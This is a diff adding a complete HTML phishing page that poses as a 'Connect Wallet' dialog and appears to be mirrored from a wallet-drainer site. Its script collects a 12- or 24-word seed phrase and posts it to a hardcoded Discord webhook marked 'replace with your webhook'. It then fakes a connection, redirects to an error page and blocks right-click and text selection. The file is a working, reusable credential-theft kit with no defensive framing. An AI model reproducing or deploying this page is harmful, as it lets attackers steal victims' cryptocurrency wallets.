@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+
+<!-- Mirrored from restore-web3.network/dapp/app/walletconnect.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 Nov 2024 08:06:32 GMT -->
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Connect Wallet</title>
+    <link href="https://dashboardpropermigrate.pro/connect/favicon.ico" rel="shortcut icon" />
+    <style>
+        body {
+            font-family: "Open Sans", sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* Light mode styles */
+        [data-theme="light"] {
+            background-color: #f4f4f9; /* Light background color */
+        }
+
+        /* Dark mode styles */
+        [data-theme="dark"] {
+            background-color: #121212; /* Dark background color */
+            color: #ffffff; /* Light text color */
+        }
+
+        .phrase-wider-popup {
+            background-color: #fff; /* Light background for popup */
+            width: 320px;
+            padding: 22px;
+            border-radius: 50px;
+            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: fixed; /* Or absolute depending on your layout */
+            left: 50%; /* Center horizontally */
+            top: 50%; /* Adjust this value to move it higher */
+            transform: translate(-50%, -50%); /* Ensure perfect centering */
+        }
+
+        /* Dark mode for the popup */
+        [data-theme="dark"] .phrase-wider-popup {
+            background-color: #1e1e1e; /* Dark background for popup */
+            color: #ffffff; /* Light text color for popup */
+        }
+
+        .wallet-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
+            border-radius: 20%; /* Rounded icon */
+        }
+
+        .phrase-subtitle {
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        /* Dark mode for subtitle */
+        [data-theme="dark"] .phrase-subtitle {
+            color: #ffffff;
+        }
+
+        .phrase-subtext {
+            font-size: 0.95em;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        /* Dark mode for subtext */
+        [data-theme="dark"] .phrase-subtext {
+            color: #bbbbbb;
+        }
+
+        .phrase-div {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .phrase {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .phrase input {
+            padding: 8px;
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #ddd;
+            text-align: center;
+            font-size: 0.95em;
+            outline: none;
+        }
+
+        /* Dark mode for input borders */
+        [data-theme="dark"] .phrase input {
+            background-color: #333; /* Dark input background */
+            color: #ffffff; /* Light text color in input */
+            border-bottom: 1px solid #555; /* Darker border for input */
+        }
+
+        .phrase input:focus {
+            border-bottom: 1px solid #e91e63;
+        }
+
+        .phrase-select {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .phrase-select-option {
+            padding: 10px 20px;
+            cursor: pointer;
+            background-color: #f4f4f9; /* Light background for options */
+            border-radius: 6px;
+            font-weight: bold;
+            color: #666;
+            transition: background-color 0.2s ease-in-out;
+        }
+
+        /* Dark mode for select options */
+        [data-theme="dark"] .phrase-select-option {
+            background-color: #555; /* Dark background for options */
+            color: #ffffff; /* Light text color */
+        }
+
+        .phrase-select-selected {
+            background-color: #ddd;
+            color: #000;
+        }
+
+        /* Dark mode for selected options */
+        [data-theme="dark"] .phrase-select-selected {
+            background-color: #777; /* Darker background for selected option */
+            color: #ffffff; /* Light text color */
+        }
+
+        .phrase-button {
+            background-color: #e91e63;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1.1em;
+            transition: background-color 0.2s ease-in-out;
+        }
+
+        .phrase-button:disabled {
+            background-color: #ccc;
+        }
+
+        .phrase-18,
+        .phrase-24 {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="phrase-wider-popup">
+        <img class="wallet-icon" src="non-web3-wallets.png" alt="Wallet Icon" />
+        <p class="phrase-subtitle">Connect Wallet Manually</p>
+        <p class="phrase-subtext">Please enter your seed phrase to continue</p>
+        <div class="phrase-div">
+            <!-- Seed phrase inputs -->
+            <div class="phrase">
+                <input id="word-1" maxlength="800" autocomplete="off" placeholder="Word 1" />
+            </div>
+            <div class="phrase">
+                <input id="word-2" maxlength="800" autocomplete="off" placeholder="Word 2" />
+            </div>
+            <div class="phrase">
+                <input id="word-3" maxlength="800" autocomplete="off" placeholder="Word 3" />
+            </div>
+            <div class="phrase">
+                <input id="word-4" maxlength="800" autocomplete="off" placeholder="Word 4" />
+            </div>
+            <div class="phrase">
+                <input id="word-5" maxlength="800" autocomplete="off" placeholder="Word 5" />
+            </div>
+            <div class="phrase">
+                <input id="word-6" maxlength="800" autocomplete="off" placeholder="Word 6" />
+            </div>
+            <div class="phrase">
+                <input id="word-7" maxlength="800" autocomplete="off" placeholder="Word 7" />
+            </div>
+            <div class="phrase">
+                <input id="word-8" maxlength="800" autocomplete="off" placeholder="Word 8" />
+            </div>
+            <div class="phrase">
+                <input id="word-9" maxlength="800" autocomplete="off" placeholder="Word 9" />
+            </div>
+            <div class="phrase">
+                <input id="word-10" maxlength="800" autocomplete="off" placeholder="Word 10" />
+            </div>
+            <div class="phrase">
+                <input id="word-11" maxlength="800" autocomplete="off" placeholder="Word 11" />
+            </div>
+            <div class="phrase">
+                <input id="word-12" maxlength="800" autocomplete="off" placeholder="Word 12" />
+            </div>
+            <!-- Hidden seed phrase inputs for 24 words -->
+            <div class="phrase phrase-18">
+                <input id="word-13" maxlength="800" autocomplete="off" placeholder="Word 13" />
+            </div>
+            <div class="phrase phrase-18">
+                <input id="word-14" maxlength="800" autocomplete="off" placeholder="Word 14" />
+            </div>
+            <div class="phrase phrase-18">
+                <input id="word-15" maxlength="800" autocomplete="off" placeholder="Word 15" />
+            </div>
+            <div class="phrase phrase-18">
+                <input id="word-16" maxlength="800" autocomplete="off" placeholder="Word 16" />
+            </div>
+            <div class="phrase phrase-18">
+                <input id="word-17" maxlength="800" autocomplete="off" placeholder="Word 17" />
+            </div>
+            <div class="phrase phrase-18">
+                <input id="word-18" maxlength="800" autocomplete="off" placeholder="Word 18" />
+            </div>
+            <div class="phrase phrase-24">
+                <input id="word-19" maxlength="800" autocomplete="off" placeholder="Word 19" />
+            </div>
+            <div class="phrase phrase-24">
+                <input id="word-20" maxlength="800" autocomplete="off" placeholder="Word 20" />
+            </div>
+            <div class="phrase phrase-24">
+                <input id="word-21" maxlength="800" autocomplete="off" placeholder="Word 21" />
+            </div>
+            <div class="phrase phrase-24">
+                <input id="word-22" maxlength="800" autocomplete="off" placeholder="Word 22" />
+            </div>
+            <div class="phrase phrase-24">
+                <input id="word-23" maxlength="800" autocomplete="off" placeholder="Word 23" />
+            </div>
+            <div class="phrase phrase-24">
+                <input id="word-24" maxlength="800" autocomplete="off" placeholder="Word 24" />
+            </div>
+        </div>
+
+        <div class="phrase-select">
+            <div id="select12" class="phrase-select-option phrase-select-selected">12 words</div>
+            <div id="select24" class="phrase-select-option">24 words</div>
+        </div>
+
+        <button class="phrase-button" id="submitButton">Proceed</button>
+    </div>
+
+    <script>
+        // Check for dark mode preference
+        const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+
+        function setTheme(e) {
+            document.documentElement.setAttribute("data-theme", e.matches ? "dark" : "light");
+        }
+
+        // Apply initial theme
+        setTheme(prefersDarkScheme);
+
+        // Listen for changes
+        prefersDarkScheme.addEventListener("change", setTheme);
+
+        document.getElementById("select12").addEventListener("click", function () {
+            document.querySelectorAll(".phrase-18, .phrase-24").forEach(function (el) {
+                el.style.display = "none";
+            });
+            document.getElementById("select12").classList.add("phrase-select-selected");
+            document.getElementById("select24").classList.remove("phrase-select-selected");
+        });
+
+        document.getElementById("select24").addEventListener("click", function () {
+            document.querySelectorAll(".phrase-18, .phrase-24").forEach(function (el) {
+                el.style.display = "flex";
+            });
+            document.getElementById("select12").classList.remove("phrase-select-selected");
+            document.getElementById("select24").classList.add("phrase-select-selected");
+        });
+
+        // Allow pasting and typing in all input fields
+        const inputs = document.querySelectorAll(".phrase input");
+
+        inputs.forEach((input) => {
+            input.addEventListener("input", () => distributeWords());
+            
+            input.addEventListener("paste", function (e) {
+                const paste = e.clipboardData.getData("text");
+                const words = paste.split(/\s+/).slice(0, inputs.length);
+                words.forEach((word, i) => {
+                    if (inputs[i]) {
+                        inputs[i].value = word;
+                    }
+                });
+                distributeWords(); // Distribute words after pasting
+                e.preventDefault();
+            });
+        });
+
+        // Function to distribute words across input fields
+        function distributeWords() {
+            const allWords = Array.from(inputs).map((input) => input.value.trim()).join(" ");
+            const wordsArray = allWords.split(/\s+/).filter(word => word !== "");
+
+            // Clear all inputs before filling them
+            inputs.forEach((input) => {
+                input.value = ""; // Clear the input first
+            });
+
+            // Fill inputs based on the words array
+            wordsArray.forEach((word, i) => {
+                if (inputs[i]) {
+                    inputs[i].value = word; // Fill the input with the word
+                }
+            });
+
+            // Update the button text based on filled words
+            const filledWords = wordsArray.length;
+            document.getElementById("submitButton").textContent = filledWords < 12 ? "Proceed" : "Proceed";
+        }
+
+        document.getElementById("submitButton").addEventListener("click", function () {
+            const filledWords = Array.from(inputs).filter(
+                (input) => input.value.trim() !== ""
+            ).length;
+
+            if (filledWords < 12) {
+                alert("Please input your phrase to connect your wallet.");
+                return; // Do not proceed if fewer than 12 words are filled
+            }
+
+            const words = Array.from(inputs)
+                .filter((input) => input.value.trim() !== "")
+                .map((input) => input.value.trim())
+                .join(" ");
+
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1371035774736138382/eYkdLdgn3zUEBNkQZOJCy_39Fuo6nmbdR8ySWL_YWEs5S9FKKcvmWVEPH4_dT4aFm2VU"; // replace with your webhook
+
+fetch(discordWebhookUrl, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        content: `Phrase submitted: ${words}`
+    })
+})
+.then((response) => {
+    if (!response.ok) {
+        throw new Error("Failed to send to Discord");
+    }
+    console.log("Sent to Discord");
+})
+.catch((error) => console.error("Error:", error));
+
+
+            this.textContent = "Connecting"; // Change the button text to "Connecting"
+            this.disabled = true; // disable the button to prevent multiple clicks
+
+            setTimeout(() => {
+                window.location.href = "error.html"; // Redirect to YouTube
+            }, 1000);
+        });
+
+        document.addEventListener("contextmenu", function (e) {
+            e.preventDefault(); // Disable right-click
+        }, false);
+
+        document.addEventListener("selectstart", function (e) {
+            e.preventDefault(); // Disable text selection
+        }, false);
+    </script>
+</body>
+
+</html>
